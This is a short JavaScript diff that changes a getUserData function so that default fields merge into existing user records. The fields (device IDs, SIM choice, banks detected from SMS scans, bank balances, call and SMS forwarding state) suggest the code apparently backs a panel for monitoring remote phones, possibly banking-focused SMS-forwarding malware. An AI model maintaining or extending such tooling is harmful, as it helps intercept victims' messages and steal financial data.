@@ -144,25 +144,26 @@ const isAdmin = uid => (state.admins || []).some(a => parseInt(a, 10) === parseI
 
 function getUserData(userId) {
   const uid = String(userId);
-  if (!state.users[uid]) {
-    state.users[uid] = {
-      fb_urls: [],
-      active_fb_url: '',
-      data_path: 'clients',
-      device_id: '',
-      device_name: '',
-      default_sim: 'sim1',
-      channels: [],            // channel ids for auto token
-      auto_forward: true,
-      bank_balances: {},       // deviceId -> bank -> {balance, timestamp}
-      detected_banks: {},      // deviceId -> [banks] from SMS scan
-      fwd_state: {},           // deviceId -> {call:{enabled,to}, sms:{enabled,to}}
-      createdAt: new Date().toISOString(),
-      lastSeen: new Date().toISOString()
-    };
-    saveState();
-  }
+  const existed = !!state.users[uid];
+  if (!state.users[uid]) state.users[uid] = {};
+  const defaults = {
+    fb_urls: [],
+    active_fb_url: '',
+    data_path: 'clients',
+    device_id: '',
+    device_name: '',
+    default_sim: 'sim1',
+    channels: [],
+    auto_forward: true,
+    bank_balances: {},
+    detected_banks: {},
+    fwd_state: {},
+    createdAt: new Date().toISOString(),
+    lastSeen: new Date().toISOString()
+  };
+  state.users[uid] = { ...defaults, ...state.users[uid] };
   state.users[uid].lastSeen = new Date().toISOString();
+  if (!existed) saveState();
   return state.users[uid];
 }
 
